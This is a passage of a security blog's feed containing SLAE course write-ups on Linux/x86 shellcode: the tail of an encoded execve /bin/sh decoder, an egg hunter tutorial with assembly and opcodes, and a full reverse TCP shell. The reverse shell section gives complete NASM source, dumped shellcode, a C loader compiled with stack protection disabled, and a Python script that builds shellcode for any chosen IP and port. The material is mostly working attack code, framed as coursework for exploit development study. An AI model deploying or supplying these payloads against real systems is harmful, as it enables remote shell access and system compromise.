&lt;img src=&quot;/assets/asn-4-asm-link-dump.PNG&quot; alt=&quot;Assemble Link Dump Shellcode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Insert the shellcode in the c template file.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
unsigned char code[] = \
&quot;\xeb\x40\x5e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x56\x5f\xb1\x18\x8a\x1e\x8a\x46\x01\x30\x5e\x01\x88\xc3\x46\xe2\xf5\x89\xfe\xb1\x03\x56\x8a\x1e\xb2\x18\x8d\x3e\x8a\x46\x01\x88\x07\x46\xfe\xca\x75\xf4\x88\x1e\x5e\xe2\xea\xb1\x19\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xbb\xff\xff\xff\x5e\xc6\x13\x77\xe2\xe7\xda\xa0\xda\xfc\xc1\xfc\x86\xb1\x8d\xb6\x6a\xdc\xd9\x05\xb2\xb4\x68\xdc\x39&quot;;

main()
{
	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compile the shellcode.c file and Let us analyze the execution with the help of GDB and observe the decoding process.
&lt;img src=&quot;/assets/asn-4-disas-1.PNG&quot; alt=&quot;GDB Disassembly Breakpoints1&quot; /&gt;
&lt;img src=&quot;/assets/asn-4-disas-2.PNG&quot; alt=&quot;GDB Disassembly Breakpoints2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Having set break points after each stage of decoding, we can now see the changes happening to the shellcode.
&lt;img src=&quot;/assets/asn-4-disas-3.PNG&quot; alt=&quot;Intermediate Decode Stages&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the decoding process, we can see the original Execve /bin/sh shellcode.
&lt;img src=&quot;/assets/asn-4-disas-4.PNG&quot; alt=&quot;Final decoded Shellcode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, Let us execute the our decoder executable to see if actually works or not.
&lt;img src=&quot;/assets/asn-4-shellcode-exec.PNG&quot; alt=&quot;Running Decoder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are done :)&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment  3 - Egg Hunter (Linux/x86)</title>
   <link href="http://localhost:4000/2017/08/13/slae-x86-assignment-3-egghunter/"/>
   <updated>2017-08-13T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/08/13/slae-x86-assignment-3-egghunter</id>
   <content type="html">&lt;p&gt;The third assigment is to study about Egg Hunters and implement a working demo of egg hunters with configurable payloads. So, what is an &lt;strong&gt;Egg Hunter&lt;/strong&gt;?!.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;An egghunter is a short piece of code which is safely able to search the Virtual Address Space for
an “egg” – a short string signifying the beginning of a larger payload. The egghunter code will
usually include an error handling mechanism for dealing with access to non allocated memory
ranges.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;!-- more --&gt;

&lt;p&gt;Often during exploit research, we may have control over a small amount of space, say 50 bytes. But in most cases, this much space is not  enough to accomodate a reverse shell or or bind shell. We may observe that a larger space is available somewhere else enough to accomodate a larger payload. But its location in memory is not known. Here is where egg hunters come in to play. A unique mark (EGG) is prepended before the shellcode and the egghunter will safely search the virtual address space for this egg. Once the egg is found the egghunter will jump to the larger payload followed by the egg.&lt;/p&gt;

&lt;p&gt;There is wonderful paper regarding egg hunter implementations on both Linux and Windows platforms - &lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot;&gt;Safely Searching Process Virtual Address Space&lt;/a&gt;. I found this very comprehensive and easy to follow. For Linux, the author - Matt Miller (skape) - explains in detail 3 implementaions of egghunter, each with their Pros and Cons. I will be using the second implementation of egg hunter in the aforementioned paper.&lt;/p&gt;

&lt;p&gt;As described in the paper, the three requirements of an egg hunter are:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;It must be robust&lt;/strong&gt; - This requirement is used to express the fact that the egg hunter must be capable of searching through memory regions that are invalid and would otherwise crash the application if they were to be dereferenced improperly. It must also be capable of searching for the egg anywhere in memory.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;It must be small&lt;/strong&gt; - Given the scope of this paper, size is a principal requirement for the egg hunters as they must be able to go where no other payload would be able to fit when used in conjunction with an exploit. The smaller the better.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;It should be fast&lt;/strong&gt; - In order to avoid sitting idly for minutes while the egg hunter does its task, the methods used to search VAS should be as quick as possible, without violating the first requirement or second requirements without proper justification.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, without further ado, lets look at one of the egg hunter implementations.&lt;/p&gt;

&lt;h3 id=&quot;matt-millers-access2---revisited-egg-hunter&quot;&gt;Matt Miller’s “access(2) - revisited” Egg hunter&lt;/h3&gt;

&lt;p&gt;The reason why I chose this implementaion is that it does not require the egg itself to be executable assembly, opening up a wider range of possible eggs to be used when searching, thus making it much more robust. In this implementation an &lt;strong&gt;eight byte egg&lt;/strong&gt; is used when doing the searching. The reason for this stems from the fact that the implementations for the egg hunting algorithms tend to have a four byte version of the key stored once in the searching code itself, thus it might be possible if one were to use a four byte version of the key to accidentaly run into the egg hunter itself vice running into the expected buffer.&lt;/p&gt;

&lt;p&gt;So, in the following implementation of egg hunter we are searching for two consecutive occurrances EGG (0x50905090).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;EGG
EGG
&amp;lt;Larger Shellcode&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The egg hunter must be capable of searching through memory regions. This is where the &lt;code&gt;access(2)&lt;/code&gt; system call is helpful. The real purpose of &lt;code&gt;access(2)&lt;/code&gt; system call is to check and see if the current process has the specific access rights to a given file on disk. The man page entry for &lt;code&gt;access(2)&lt;/code&gt; is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int access(const char *pathname, int mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;pathname&lt;/code&gt; pointer is the argument that will be used to do the address validation. The system call number for &lt;code&gt;access(2)&lt;/code&gt; is defined in &lt;code&gt;/usr/include/i386-linux-gnu/asm/unistd_32.h&lt;/code&gt; as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define __NR_access 33
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When a system call encounters an invalid memory address, most will return the EFAULT (-14)error code to indicate that a pointer provided to the system call was not valid. This logic is applied in this egg hunter.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;;
; Description	: Matt Miller's access(2) - revisited Egg Hunter 
; File 		: egghunter.nasm
;


global _start

section .text
	_start:
		
		
		xor edx,edx			; EDX holds the pointer that is to be validated by the access system call
	
		next_page:
			or dx,0xfff		; page alignment logic
						; allows the hunting code to move up in PAGE SIZE
                           			; increments vice doing in single byte increments.
		
			next_address:
				inc edx
	
				; validating eight bytes of contiguous memory in a single swoop
				; The reason that it works in all cases is because the implementation
				; will increment by PAGE SIZE when it encounters invalid addresses, thus it’s
				; impossible that edx plus four could be valid and edx itself not be valid.
			
				lea ebx,[edx+0x4]

				push byte +0x21
				pop eax			; EAX = 33 = access()
				int 0x80

				; if memory pointed by ebx is not accessible, 
        	    		; then access() syscall returns value 0xfffffff2 (-14) EFAULT to EAX
				; compare the lower bytes of EAX with 0xf2

				cmp al,0xf2
				jz next_page	; pointer not valid

		; pointer is valid, search for egg
		
		mov eax,0x50905090	; EGG = 0x50905090
		mov edi,edx			; EDX has the valid pointer, copy it to edi
		scasd				; check for first appearance of EGG
        					; compare EAX with contents of memory pointed by EDI,
    						; EDI is incremented automatically by 4 bytes after SCASD (Even if scasd comparison are not equal)
		jnz next_address	; EGG not found, got to next address in page
		scasd			; Check for consecutive second appearance of EGG
		jnz next_address	; EGG not found, got to next address in page
		jmp edi			; we found egg consecutively two times, now EDI  = EDX + 8 = start of shellcode, jump to it
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Assemble, Link the egghunter assembly file and Dump shellcode from the executable using &lt;code&gt;objdump&lt;/code&gt;. Later we will put this in a c file to test the egg hunter.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// egg hunter shellcode
// EGG : 0x50905090
&quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The following assembly code prints the string “EGG IS FOUND” onto stdout.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;;
; Author 	: RIZAL MUHAMMED (UB3RSiCK)
; Description 	: Print EGG IS FOUND
;

global _start
section .text
	_start:
		xor eax, eax
		mov al, 0x4			; write syscall
		
		xor ebx, ebx
		mov bl, 0x1			; write to stdout
		
		xor ecx, ecx
		jmp short get_me_buffer_address
			here_is_your_buffer:
				pop ecx		; now ecx will have address of message

		xor edx, edx
		mov dl, 0xd			; param3 how many bytes to write
		int 0x80

		; exit the program

		xor eax, eax			; exit system call - #define __NR_exit 1
		mov al, 0x1
		int 0x80

		get_me_buffer_address:
			call here_is_your_buffer				; when call is executed, address of message is
			message db &quot;EGG IS FOUND&quot;, 0xA			; pushed on to the stack

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Assemble, Link the above assembly code and Dump the shellcode from executable.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&quot;\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xc9\xeb\x0d\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xee\xff\xff\xff\x45\x47\x47\x20\x49\x53\x20\x46\x4f\x55\x4e\x44\x0a&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Insert the egg hunter shellcode and the shellcode to print “EGG IS FOUND” to the following c file. Different shellcode payloads of different sizes can be used. The place where to put in shellcode is marked in the template file.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char egghunter[] = \
&quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7&quot;;


unsigned char shellcode[] = \
&quot;\x90\x50\x90\x50&quot; //egg mark 1
&quot;\x90\x50\x90\x50&quot; //egg mark 2

// Place second stage larger payload here
// Print EGG IS FOUND shellcode
&quot;\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xc9\xeb\x0d\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0&quot;
&quot;\xb0\x01\xcd\x80\xe8\xee\xff\xff\xff\x45\x47\x47\x20\x49\x53\x20\x46\x4f\x55\x4e\x44\x0a&quot;;

main()
{
        printf(&quot;Egghunter Shellcode Length:  %d\n&quot;, strlen(egghunter));
        int (*ret)() = (int(*)())egghunter;
        ret();

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compile the c file and execute.
&lt;img src=&quot;/assets/asn-3-egg-found.PNG&quot; alt=&quot;Running Egg Hunter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now use larger shellcodes, just insert shellcode in the above c file and compile. And we are done. Nice.&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment 2 - Shell Reverse TCP (Linux/x86)</title>
   <link href="http://localhost:4000/2017/08/03/slae-x86-assignment-2-shell-rev-tcp-shellcode/"/>
   <updated>2017-08-03T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/08/03/slae-x86-assignment-2-shell-rev-tcp-shellcode</id>
   <content type="html">&lt;h3 id=&quot;assignment-2-shell-reverse-tcp-shellcode-linuxx86&quot;&gt;Assignment #2: Shell Reverse TCP Shellcode (Linux/x86)&lt;/h3&gt;
&lt;p&gt;The second assigment is to create Reverse TCP Shellcode which does following.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Connects back to an IP address and port&lt;/li&gt;
  &lt;li&gt;Execs a shell upon connection&lt;/li&gt;
  &lt;li&gt;The IP address  and port number are configurable&lt;/li&gt;
&lt;/ul&gt;

&lt;!-- more --&gt;

&lt;p&gt;So, our approach to writing assembly code for this challenge is as follows:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Create a socket with SYS_SOCKET&lt;/li&gt;
  &lt;li&gt;Connect to IP and Port with SYS_CONNECT&lt;/li&gt;
  &lt;li&gt;Redirect stdin, stdout, stderr with SYS_DUP2&lt;/li&gt;
  &lt;li&gt;Exec /bin/sh with SYS_EXECVE&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;create-a-socket-with-sys_socket&quot;&gt;Create a socket with SYS_SOCKET&lt;/h3&gt;
&lt;p&gt;Since we have already explained in detail about how do we create a socket, there is no need to describe it further. Assembly code:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; int socketcall(int call, unsigned long *args)
						; socketcall - socket system calls
						; call determines which socket function to invoke
						; args points to a block containing the actual arguments, 
            ; which are passed through to the appropriate call.
						
		; int socket(int domain, int type, int protocol); 
						; [/usr/include/linux/net.h] 
						; [#define SYS_SOCKET 1] [sys_socket(2)]

		; domain 	= AF_INET	; [/usr/include/i386-linux-gnu/bits/socket.h] 
						; [#define AF_INET PF_INET]
						; [#define PF_INET 2]
						; [IP protocol family]	 

		; type 	= SOCK_STREAM	; [/usr/include/i386-linux-gnu/bits/socket.h]
						; [SOCK_STREAM = 1]
						; [Sequenced, reliable, connection-based byte streams]

		; protocol 	= IP_PROTO	; [/usr/include/linux/in.h] 
						; [IPPROTO_IP = 0]
						; [Dummy protocol for TCP]
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			  ; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			    ; Argument 3 for socket() =&amp;gt;  	IPPROTO_IP = 0
		mov al, 0x66

		push byte 0x1
		pop ebx				    ; sys_socket()
		
		push byte 0x1			; Argument 2 for socket() =&amp;gt; 	SOCK_STREAM = 1
		push byte 0x2			; Argument 1 for socket() =&amp;gt; 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			    ; returns socket file descriptor to EAX
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We would require the socket file descriptor for later use. So, we need to save it in some register.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		push eax						
		pop esi				    ; clears ESI and saves sockfd in ESI
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;connect-to-ip-and-port-with-sys_connect&quot;&gt;Connect to IP and Port with SYS_CONNECT&lt;/h3&gt;
&lt;p&gt;First lets try and connect to our local machine itself on port 4321.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; connect to localhost:port with sys_connect
		; #define SYS_CONNECT	3		/* sys_connect(2)		*/
		; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The man page entry for connect is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets look at the important one &lt;code&gt;struct sockaddr *addr&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// IPv4 AF_INET sockets:
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};

struct in_addr {
    unsigned long s_addr;          // load with inet_pton()
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To fulfil our need, the contents of &lt;code&gt;sockaddr&lt;/code&gt; should be as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sin_family = AF_INET = 2
sin_port = 0xe110 = hex(htons(4321))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For determining the value of &lt;code&gt;sin_addr&lt;/code&gt;, I have written a simple python script which accepts ip address and spits out shellcode ready value (provided ip address does not contain any null values).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/env python

'''
Author	: RIZAL MUHAMMED (UB3RSiCK)
Desc	: IP address to Network Byte Order Converter
'''

import sys

if not len(sys.argv) == 2:
	print &quot;Usage: {} ip&quot;.format(sys.argv[0])
	sys.exit()


ip = sys.argv[1]
hex_ip = map(lambda x: '0'+x if not len(x) == 2 else x , [hex(int(item))[2:] for item in ip.split('.')[::-1]])
if '00' in hex_ip:
	print &quot;IP Address contains nullbyte: {}&quot;.format(hex_ip)
	sys.exit()
print &quot;ip_address: {}\nnetwork_byte_order: {}&quot;.format(ip, '0x' + ''.join(hex_ip))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets run it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python ip-conv.py 127.1.1.1
ip_address: 127.1.1.1
network_byte_order: 0x0101017f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So &lt;code&gt;sin_addr = 0x0101017f&lt;/code&gt;.
Assembly Code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x3  = sys_connect()
		; ECX = pointer to arguments of sys_connect

		; connect(sockfd, *ptr-&amp;gt;[2, 0xe110, 0x0101017f], 16)

		mov al, 0x66
		pop ebx			      ; EBX = 2 now
		
		push 0x0101017f		; 127.1.1.1 Network byte order
		push word 0xe110	; port 4321
		push word bx		  ; AF_INET = 2

		mov ecx, esp		  ; ecx now points to struct sockaddr
		push 0x10		      ; addrlen = 16
		push ecx		      ; pointer to sockaddr
		push esi		      ; sockfd

		mov ecx, esp		  ; pointer to sys_connect args
		inc ebx			      ; EBX  = 3 ; sys_connect

		int 0x80

		xchg ebx, esi		  ; old sockfd in ebx for dup2		
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;redirect-stdin-stdout-stderr-with-sys_dup2&quot;&gt;Redirect stdin, stdout, stderr with SYS_DUP2&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; Redirect stdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f
			int 0x80
			dec ecx
			jns dup_loop
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;exec-binsh-with-sys_execve&quot;&gt;Exec /bin/sh with SYS_EXECVE&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; execve /bin/sh
		
		xor eax, eax
		push eax		; push null onto stack
		mov al, 0x0b
		
		push 0x68732f2f
		push 0x6e69622f

		mov ebx, esp
		xor ecx, ecx
		xor edx, edx

		int 0x80

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;complete-shellcode&quot;&gt;Complete Shellcode&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;;
; Author 	: Rizal Muhammed (UB3RSiCK)
; Description	: SLAE x86 Assignment 2 - Shell Reverse TCP Shellcode (Linux/x86)
; File 		: shell-rev-tcp.nasm
; Website	: https://ub3rsick.github.io/

global _start

section .text

	_start:
		; int socketcall(int call, unsigned long *args)
						; socketcall - socket system calls
						; call determines which socket function to invoke
						; args points to a block containing the actual arguments, which are passed through to the appropriate call.
						
		; int socket(int domain, int type, int protocol); 
						; [/usr/include/linux/net.h] 
						; [#define SYS_SOCKET 1] [sys_socket(2)]

		; domain 	= AF_INET	; [/usr/include/i386-linux-gnu/bits/socket.h] 
						; [#define AF_INET PF_INET]
						; [#define PF_INET 2]
						; [IP protocol family]	 

		; type 		= SOCK_STREAM	; [/usr/include/i386-linux-gnu/bits/socket.h]
						; [SOCK_STREAM = 1]
						; [Sequenced, reliable, connection-based byte streams]

		; protocol 	= IP_PROTO	; [/usr/include/linux/in.h] 
						; [IPPROTO_IP = 0]
						; [Dummy protocol for TCP]
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			  ; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			    ; Argument 3 for socket() =&amp;gt;  	IPPROTO_IP = 0
		mov al, 0x66
		
		push byte 0x1
		pop ebx
		
		push byte 0x1			; Argument 2 for socket() =&amp;gt; 	SOCK_STREAM = 1
		push byte 0x2			; Argument 1 for socket() =&amp;gt; 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			    ; returns socket file descriptor to EAX

		push eax						
		pop esi				    ; clears esi and saves sockfd in esi

		;********************************************************************************;
		; connect to localhost:port with sys_connect
		; #define SYS_CONNECT	3		/* sys_connect(2)		*/
		; 
		
		; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x3  = sys_connect()
		; ECX = pointer to arguments of sys_connect

		; connect(sockfd, *ptr-&amp;gt;[2, 0xe110, 0x0101017f], 16)

		mov al, 0x66
		pop ebx			      ; EBX = 2 now
		
		push 0x0101017f		; 127.1.1.1 Network byte order
		push word 0xe110	; port 4321
		push word bx		  ; AF_INET = 2

		mov ecx, esp		  ; ecx now points to struct sockaddr
		push 0x10		      ; addrlen = 16
		push ecx		      ; pointer to sockaddr
		push esi		      ; sockfd

		mov ecx, esp	  	; pointer to sys_connect args
		inc ebx			      ; EBX  = 3 ; sys_connect

		int 0x80

		xchg ebx, esi		  ; old sockfd in ebx for dup2		
		;********************************************************************************;
		; Redirect stdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f
			int 0x80
			dec ecx
			jns dup_loop

		;********************************************************************************;
		; execve /bin/sh
		
		xor eax, eax
		push eax		; push null onto stack
		mov al, 0x0b
		
		push 0x68732f2f
		push 0x6e69622f

		mov ebx, esp
		xor ecx, ecx
		xor edx, edx

		int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Assembling and linking the asssembly code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nasm -f elf32 shell-rev-tcp.nasm -o shell-rev-tcp.o
ld shell-rev-tcp.o -o shell-rev-tcp-4321
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Dumping the shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;objdump -d ./shell-rev-tcp-4321|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/asn-2-assembling-linking.PNG&quot; alt=&quot;Assemble Link Dump-Shellcode&quot; /&gt;
Insert the shellcode in shellcode.c template.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x50\x5e\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x10\xe1\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80&quot;;
main()
{

	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compile shellcode.c:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc shellcode.c -o shell-rev-4321 -fno-stack-protector -z execstack
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, its time to test our reverse shell. Lets setup a  netcat listener on port 4321 on our local machine and execute the reverse shell from another terminal.
&lt;img src=&quot;/assets/asn-2-rev-connect.PNG&quot; alt=&quot;Reverse Shell LocalHost&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;configure-ip-and-port&quot;&gt;Configure IP and Port&lt;/h3&gt;
&lt;p&gt;Python wrapper which prints out the complete shellcode given an IP and Port as command line arguments.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import sys

'''
Author		: RIZAL MUHAMMED (UB3RSiCK)
Description	: Prints out Reverse TCP Shellcode given ip and port
filename	: ip-port-config-shell-reverse-tcp.py 
'''

def shellip(ip):
	global hex_ip
	hex_ip = map(lambda x: '0'+x if not len(x) == 2 else x , [hex(int(item))[2:] for item in ip.split('.')])
	
	if '00' in hex_ip:
		print &quot;IP Address contains nullbyte: {}&quot;.format(hex_ip)
		sys.exit()
	else:
		return ''.join([r'\x'+item for item in hex_ip])
		

def shellport(port):
	global hex_port
	hex_port = hex(port)[2:]

	if len(hex_port) &amp;lt; 4:
        	# for all port number &amp;gt; 1000, len(hex(port)) will be 3 or more, not less than that
        	hex_port = &quot;0&quot; + hex_port

	h1 = hex_port[:2]
	h2 = hex_port[2:]

	if h1 == &quot;00&quot; or h2 == &quot;00&quot;:
        	print &quot;port number contain null byte, please choose different port number&quot;
        	sys.exit()

	port_no = r'\x{}\x{}'.format(h1,h2)
	return port_no


if not len(sys.argv) == 3:
	print 'Usage: {} ip port'.format(sys.argv[0])
	sys.exit()

ip = sys.argv[1]
ip_addr_shellcode = shellip(ip)


port = int(sys.argv[2])

# Check if user has passed invalid port number
if port &amp;lt; 1000 or port &amp;gt; 65535 :
	print &quot;Either port number less than 1000: user needs to be root&quot;
	print &quot;Or&quot;
	print &quot;Port number greater than 65535&quot;
	sys.exit()

port_no_shellcode = shellport(port)

print '\nIP: {0}, Hex: {1}, inShellcode: {2}'.format(ip, hex_ip, ip_addr_shellcode)
print 'Port: {0} , Hex = {1}, inShellcode = {2}\n'.format(port, hex_port, port_no_shellcode)


shellcode = (r&quot;\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x50\x5e\xb0\x66\x5b\x68&quot; +
             ip_addr_shellcode +       # this is where our ip address will be
             r&quot;\x66\x68&quot; +
             port_no_shellcode +               # this is where we need to put in port number
             r&quot;\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc0\x31\xc9\xb1\x02\xb0&quot; +
             r&quot;\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80&quot;)

print '&quot;'+shellcode+'&quot;\n'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets look at ip address of another machine on my network.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/asn-2-another-machine-ip.PNG&quot; alt=&quot;Another Machine on Network&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Run the python wrapper script with the ip address and desired port as arguments.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python ip-port-config-shell-reverse-tcp.py 192.168.56.102 6767
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/asn-2-ip-port-config-script.PNG&quot; alt=&quot;Python Wrapper IP and Port&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once again insert the shellcode in &lt;code&gt;shellcode.c&lt;/code&gt; then compile the file. Now its time to test our reverse shell once again.&lt;/p&gt;

